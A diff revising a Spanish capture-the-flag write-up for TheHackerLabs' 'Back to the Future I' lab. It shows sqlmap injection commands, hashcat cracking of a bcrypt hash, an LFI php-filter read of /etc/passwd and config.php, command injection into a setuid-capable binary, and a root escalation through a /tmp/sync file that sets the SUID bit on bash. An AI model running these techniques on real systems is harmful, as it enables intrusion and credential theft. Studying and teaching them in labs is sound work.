@@ -1,27 +1,20 @@
 ---
 layout: post
-title: Back To The Future I - TheHackerLabs - Linux
+title: "TheHackerLabs: Back to the Future I - Writeup, SQLi y LFI"
+description: "Resuelve Back to the Future I de TheHackerLabs: SQLi, LFI, claves SSH y escalada de privilegios en Linux con cap_setuid."
 date: 2026-11-18
-tags:
-- `nmap`
-- `whatweb`
-- `gobuster`
-- `sqlmap`
-- `hashcat`
-- `curl`
-- `ftp`
-- `zip2john` / `john`
-- `ssh2john`
-- `ssh-keygen`
-- `getcap`
-
+last_modified_at: 2026-11-19
+img: /assets/img/backtothefuture/Banner.png
+tags: [TheHackerLabs, Linux, SQLi, LFI, SSH, Command Injection, Capabilities, PrivEsc, nmap, whatweb, gobuster, sqlmap, hashcat, curl, ftp, john, ssh2john, ssh-keygen, getcap]
 ---
+
+![Back to the Future I: laboratorio de TheHackerLabs]({{ '/assets/img/backtothefuture/Banner.png' | relative_url }})
 
 ## TL;DR
 
-SQLi time-based blind para extraer credenciales → acceso web como marty → LFI con PHP filter para leer config.php → nuevas credenciales → backup.zip por FTP con clave SSH cifrada → passphrase crackeada → acceso SSH como marty → command injection en backup_runner (SUID+capability cap_setuid) → escalada a docbrown → sudo NOPASSWD en time_daemon vulnerable (lee /tmp/sync) → escalada a root.
+SQLi time-based blind para extraer credenciales → acceso web como marty → LFI con PHP filter para leer config.php → nuevas credenciales → backup.zip por FTP con clave SSH cifrada → passphrase crackeada → acceso SSH como marty → command injection en backup_runner (capability cap_setuid) → escalada a docbrown → sudo NOPASSWD en time_daemon vulnerable (lee /tmp/sync) → escalada a root.
 
-# Introducción
+## Introducción
 
 **Back to the Future I** es una máquina de TheHackerLabs, ambientada en el universo de la trilogía cinematográfica. El laboratorio simula una aplicación web temática (“Time Travel Log”) que registra eventos espacio-temporales, y nos reta a explotar una cadena completa de vulnerabilidades: desde una inyección SQL ciega hasta una escalada de privilegios a root, pasando por LFI, filtración de credenciales, acceso FTP, cifrado de claves SSH y configuraciones inseguras de sudo y capabilities de Linux.
 
@@ -35,29 +28,29 @@ Comenzamos con la fase de reconocimiento con nuestra herramienta **Auto_Recon**,
 
 ## Enumeración
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200134.png)
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200209.png)
+![Reconocimiento de servicios](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200134.png)
+![Resultados del reconocimiento](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200209.png)
 
 Como vimos en otro laboratorio, `whatweb` nos muestra un error al intentar abrir un dominio.
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200318.png)
+![Detección del dominio con WhatWeb](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200318.png)
 
 Agregamos este dominio a nuestro archivo `/etc/hosts`
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200416.png)
+![Configuración del dominio local](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200416.png)
 
 ahora podemos realizar el escaneo de directorios 
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118201406.png)
+![Enumeración de directorios web](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118201406.png)
 
 
 Al investigar en la página nos encontramos con una pista.
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118201531.png)
+![Pista en la página web](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118201531.png)
 
 `<!-- ¡El reloj de la torre no tiene nada que ver! ¿O sí? -->`
 
 Además un panel de login.
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118201633.png)
+![Formulario de acceso](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118201633.png)
 
 No tenemos éxito 
 
@@ -67,7 +60,7 @@ Ya que no tenemos mayor información, vamos a centrarnos en SQL. Utilizaremos la
 sqlmap -u "http://hillvalley.thl/index.php" --data="username=admin&password=admin" -p username --batch --dbs
 ```
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118203826.png)
+![Bases de datos identificadas](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118203826.png)
 
 ### Que hace este comando? 
 
@@ -90,7 +83,7 @@ sqlmap -u "http://hillvalley.thl/index.php" --data="username=admin&password=admi
 con `-D` apuntamos a la base de datos que encontramos en el paso anterior.
 `--tables` le pedimos a `sqlmap` que liste todas las tablas dentro de la base.
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118204139.png)
+![Tablas de la aplicación](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118204139.png)
 
 El resultado fue la tabla `users`. Y ya que tenemos la base de datos, y el nombre de la tabla, lanzamos el comando:
 
@@ -100,20 +93,20 @@ sqlmap -u "http://hillvalley.thl/index.php" --data="username=admin&password=admi
 
 agregamos `-T users` para indicarle el nombre de la tabla que encontramos en el paso anterior y `--dump` para extraer todas las filas y columnas de esa tabla.
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118204504.png)
+![Extracción de la tabla users](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118204504.png)
 
 Ya tenemos información.
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118205029.png)
+![Credenciales de marty](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118205029.png)
 
 Tenemos al usuario `marty` y su contraseña hasheada.
-`sqlmap` nos avisa que el crackeo con diccionario en `Python` es muy leto para bcrypt, así que mejor usaremos una herramienta dedicada.
+`sqlmap` nos avisa que el crackeo con diccionario en `Python` es muy lento para bcrypt, así que mejor usaremos una herramienta dedicada.
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118205507.png)
+![Aviso sobre recuperación de bcrypt](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118205507.png)
 
 Así que nuestro siguiente paso será guardar el hash y utilizar `hashcat`
 
 ```bash 
-`echo '$2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy' > marty.txt`
+echo '$2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy' > marty.txt
 ```
 
 y crackeamos con `hashcat`
@@ -124,24 +117,26 @@ hashcat -m 3200 marty.txt /usr/share/wordlists/rockyou.txt
 
 
 y el resultado:
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210054.png)
+![Resultado de Hashcat](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210054.png)
 
 Al ingresar estas credenciales en el login del servicio web tenemos acceso al panel de administración.
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210220.png)
+![Acceso al panel de administración](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210220.png)
 
 Tenemos información en el panel
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210521.png)
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210533.png)
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210543.png)
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210552.png)
+![Información del panel de administración](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210521.png)
+![Información del panel de administración](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210533.png)
+![Información del panel de administración](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210543.png)
+![Información del panel de administración](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210552.png)
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210611.png)![](Pasted%20image%2020261118210434.png)
+![Exploración del panel de administración](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210611.png)
+![Detalle del panel de administración](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210434.png)
 
-Probamos LFI para ver los usuarios activos en el servidor, tenemos exito 
+Probamos LFI para leer las cuentas locales del servidor. La lectura tiene éxito.
+El archivo `/etc/passwd` no indica qué usuarios tienen sesiones activas. 
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118211152.png)
+![Lectura de cuentas locales mediante LFI](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118211152.png)
 
 ```bash
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin tss:x:100:107:TPM software stack,,,:/var/lib/tpm:/bin/false systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:101:108::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:102:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin avahi:x:104:113:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin fwupd-refresh:x:106:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin saned:x:107:118::/var/lib/saned:/usr/sbin/nologin geoclue:x:108:119::/var/lib/geoclue:/usr/sbin/nologin polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin rtkit:x:109:120:RealtimeKit,,,:/proc:/usr/sbin/nologin colord:x:110:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin docbrown:x:1000:1000:docbrown,,,:/home/docbrown:/bin/bash sshd:x:113:65534::/run/sshd:/usr/sbin/nologin mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false marty:x:1001:1001::/home/marty:/bin/bash ftp:x:115:124:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
@@ -149,7 +144,8 @@ root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
 
 Encontramos otro usuario llamado `docbrown`. 
 
-probamos con
+Guardamos las cookies de nuestra sesión autenticada en `cookies.txt`, con formato compatible con curl.
+Después probamos la lectura del archivo de configuración.
 
 ```bash
 curl -b cookies.txt "http://hillvalley.thl/admin.php?page=php://filter/convert.base64-encode/resource=config.php"
@@ -174,7 +170,7 @@ decodificamos
 ```bash
 echo "PD9waHANCiRob3N0ID0gImxvY2FsaG9zdCI7DQokdXNlciA9ICJtYXJ0eSI7DQokcGFzcyA9ICJ0MW0zdHJhdmVsIjsNCiRkYiA9ICJoaWxsdmFsbGV5IjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkaG9zdCwgJHVzZXIsICRwYXNzLCAkZGIpOw0KaWYgKCEkY29ubikgew0KICAgIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCj8+DQo=" | base64 -d
 ```
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118212032.png)
+![Configuración de base de datos decodificada](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118212032.png)
 
 y el resultado nos muestra otra contraseña para el usuario `marty`
 
@@ -192,9 +188,9 @@ Esto quiere decir que SSH solo acepta clave pública, no contraseña. Esto nos c
 
 y entramos de manera correcta. Aquí nos encontramos tres archivos, `backup.zip`, `note_to:marty.txt` y `delorean.png`. La vamos a copiar a nuestro equipo con el comando `get` (este nos permite pasarnos los archivos desde `ftp` a nuestra máquina atacante).
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118220855.png)
+![Archivos disponibles por FTP](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118220855.png)
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118221221.png)
+![Nota del archivo de respaldo](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118221221.png)
 
 ```bash
 ┌──(yorve㉿SecNotes)-[~/Desktop/backtothefuture]
@@ -210,7 +206,7 @@ Tuve que proteger el backup del sitio web. La contraseña es una combinación de
 
 la contraseña es `delorean1955`, datos sacados de la página..
 
-![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118221536.png)
+![Extracción del respaldo ZIP](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118221536.png)
 
 tenemos algo muy valioso.. una clave rsa, vamos a confirmar si tiene `passphase`
 
@@ -255,7 +251,7 @@ Session completed.
 1. Una clave privada en texto plano es peligrosa si alguien la roba.
 2. Por eso se puede cifrar con una passphrase adicional.
 3. Esa passphrase protege la clave, igual que una contraseña protege una cuenta.
-4. Sin ella, la clave es inútil aunque la tengamos en nuestras manos.
+4. Necesitamos descubrir la passphrase para utilizar la clave privada.
 
 **Cómo identificamos que estaba cifrada:**
 
@@ -273,7 +269,7 @@ Session completed.
 
 1. Encontrar una clave SSH privada en un backup expuesto por FTP ya es grave.
 2. Que además tenga una passphrase débil (crackeable con diccionario) la hace doblemente vulnerable.
-3. Esto da acceso persistente al sistema, sin depender del RCE web que usaste antes.
+3. Esto da acceso persistente al sistema, sin depender de la sesión web.
 
 ```bash
 ┌──(yorve㉿SecNotes)-[~/Desktop/backtothefuture/project]
@@ -513,7 +509,7 @@ system
 /usr/local/bin/backup_runner test
 ```
 
-Al ejecutar este binario, `backup_runner` nos crea un archivo `/tmp/test-backup.tar.gz` con dueño `docbrown`, esto nos reveló el cambio de usuario interno: aunque no ejecutamos como `marty`, el archivo resultante pertenece a `docbrown`. Esto nos confirma que el programa, en algún momento de su ejecución, cambia de usuario (probablemente mediante `setuid()`)
+Al ejecutar este binario, `backup_runner` nos crea un archivo `/tmp/test-backup.tar.gz` con dueño `docbrown`, esto nos reveló el cambio de usuario interno: aunque lo ejecutamos como `marty`, el archivo resultante pertenece a `docbrown`. Esto nos confirma que el programa, en algún momento de su ejecución, cambia de usuario (probablemente mediante `setuid()`)
 
 Nuestro próximo paso será aprovechar la falta de sanitización que identificamos en la cadena `tar czf /tmp/%s-backup.tar.gz`, inyectando comandos adicionales a través del argumento `filename`.
 
@@ -577,7 +573,7 @@ marty@hillvalley:/home/docbrown$ getcap /usr/local/bin/backup_runner
 2. `e` significa “effective” — la capability está activa mientras el programa corre.
 3. `p` significa “permitted” — el programa tiene permiso de usarla.
 
-**Por qué esto es más peligroso que el SUID tradicional en este caso:**
+**Diferencia entre la shell SUID y la capability en este laboratorio:**
 
 1. Con SUID normal, solo cambia nuestra **euid** (efectiva) mientras el proceso corre.
 2. Con `cap_setuid`, el programa puede cambiar su **UID real completo** mediante `setuid()`, quedando “siendo” ese usuario de verdad, no solo aparentándolo.
@@ -605,7 +601,8 @@ docbrown@hillvalley:/home/docbrown$
 ```
 ## Escalada de Privilegios
 
-Podemos ver que tenemos acceso a ejecutar `/usr/local/bin/time_daemon` sin necesidad de una contraseña. Así que nos aprovecharemos de este fallo y agregaremos una shell al binario para convertirnos en root.
+Podemos ver que tenemos acceso a ejecutar `/usr/local/bin/time_daemon` sin necesidad de una contraseña. El comportamiento documentado permite ejecutar comandos desde `/tmp/sync` con privilegios de root.
+Creamos ese archivo para modificar los permisos de Bash; no modificamos el binario `time_daemon`.
 
 ```bash
 echo "chmod +s /bin/bash" > /tmp/sync
@@ -660,8 +657,8 @@ bash-5.2#
 ## Lecciones Aprendidas
 
 
-- **Saneamiento en aplicaciones web:** la falta de sanitización en `backup_runner` permitió inyección de comandos a través de un argumento no validado antes de pasarlo a `system()`.
-- **Gestión de credenciales y contraseñas:** se reutilizaron contraseñas y hashes débiles (bcrypt crackeado con rockyou, zip con contraseña temática simple), facilitando el movimiento lateral.
+- **Validación de argumentos en programas:** la falta de sanitización en `backup_runner` permitió inyección de comandos a través de un argumento no validado antes de pasarlo a `system()`.
+- **Gestión de credenciales y contraseñas:** se reutilizaron contraseñas débiles (contraseña bcrypt recuperada con rockyou y ZIP con contraseña temática simple), facilitando el movimiento lateral.
 - **Principio de menor privilegio:** otorgar `cap_setuid` a un binario con vulnerabilidad de inyección, y permitir `sudo NOPASSWD` sobre un binario que lee comandos de un archivo externo (`/tmp/sync`), rompe el aislamiento entre usuarios.
 
 ## Herramientas Usadas
